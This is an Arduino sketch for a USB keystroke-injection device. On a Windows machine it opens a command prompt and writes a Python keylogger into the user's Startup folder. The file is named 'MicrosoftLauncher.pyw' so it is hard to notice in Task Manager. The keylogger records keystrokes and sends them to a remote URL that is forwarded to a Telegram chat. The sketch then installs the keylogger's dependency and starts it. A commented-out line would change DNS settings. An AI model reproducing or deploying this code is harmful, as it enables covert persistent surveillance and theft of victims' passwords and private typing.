#include "Keyboard.h"

void setup() {
  
   String pName="MicrosoftLauncher.pyw";
   //change extension to .pyw to avoid opening a console at boot.
   //plausible os name to avoid unexperienced people detecting it in task manager.

   // initialize control over the keyboard:
   Keyboard.begin();
   pinMode(LED_BUILTIN, OUTPUT);
   delay(500);

   //open console
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(100);
   Keyboard.releaseAll();
   Keyboard.println("cmd");
   Keyboard.write(KEY_RETURN);
   delay(500);
   //netsh interface ip set dns "Local Area Connection" static 192.168.0.200

   
   //go to a folder whose files open at boot
   Keyboard.println("cd AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
   Keyboard.write(KEY_RETURN);
   delay(500);
   Keyboard.println("notepad "+pName);
   Keyboard.write(KEY_RETURN);
   delay(500);
   Keyboard.write(KEY_RETURN);
   delay(50);

   //python code
   Keyboard.println("from pynput.keyboard import Key, Listener");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("import urllib.request as ur");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("s=\"\"");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("def on_press(key):");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("    global s");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("    if len(str(key))>3:");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("        ur.urlopen(\"https://serverurl.com/sendtotelegram?value1=\"+s)");
   Keyboard.write(KEY_RETURN); //the previous url sends the text to ifttt to be forwarded to a telegram chat.
   Keyboard.println("        s=\"\"");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("    else:");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("        s+=str(key)[1]");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("with Listener(on_press=on_press) as listener:");
   Keyboard.write(KEY_RETURN);
   Keyboard.println("    listener.join()");
   //end of python code

   //save code
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
   delay(100);
   Keyboard.releaseAll();
   delay(300);
   Keyboard.write(KEY_RETURN);
   delay(500);
   
   //installing pyinput
   Keyboard.println("pip install pynput");
   Keyboard.write(KEY_RETURN);
   delay(10000);//time for pyimput to install
   Keyboard.println(pName);
   Keyboard.write(KEY_RETURN);
   delay(500);

   //close terminal, comment if using py extension.
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
   delay(100);
   Keyboard.releaseAll();
}

void loop() {
  
  // LED blinking animation when finished.
  //in case there is a led to blink in the board
  
  digitalWrite(LED_BUILTIN, HIGH);   
  delay(1000);                     
  digitalWrite(LED_BUILTIN, LOW);    
  delay(1000); 
}
